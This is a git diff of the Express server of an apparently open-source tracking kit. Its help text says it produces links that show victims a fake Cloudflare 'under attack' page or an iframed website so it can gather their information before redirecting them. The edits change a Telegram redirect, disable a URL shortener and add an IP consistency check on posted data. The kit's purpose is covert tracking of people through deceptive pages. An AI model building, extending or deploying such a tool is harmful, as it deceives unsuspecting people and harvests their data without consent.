@@ -1,3 +1,4 @@
+require('dotenv').config();
 const fs = require("fs");
 const express = require("express");
 var cors = require('cors');
@@ -16,7 +17,7 @@ app.set("view engine", "ejs");
 //Modify your URL here
 var hostURL="YOUR URL";
 //TOGGLE for Shorters
-var use1pt=true;
+var use1pt=false;
 
 
 
@@ -30,7 +31,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/cyberanonoymous1996");
+res.redirect("https://t.me/th30neand0nly0ne");
 }
 
          
@@ -48,7 +49,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/cyberanonoymous1996");
+res.redirect("https://t.me/th30neand0nly0ne");
 }
 
          
@@ -84,6 +85,7 @@ the url it will send you 2 links which you can use to track people.
 \n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
+\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
 `);
 }
   
@@ -192,9 +194,17 @@ res.send("Done");
 app.post("/",(req,res)=>{
 
 var uid=decodeURIComponent(req.body.uid) || null;
-var data=decodeURIComponent(req.body.data)  || null; 
+var data=decodeURIComponent(req.body.data)  || null;
+
+var ip;
+if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
+  
 if( uid != null && data != null){
 
+ 
+if(data.indexOf(ip) < 0){
+return res.send("ok");
+}
 
 data=data.replaceAll("<br>","\n");
 
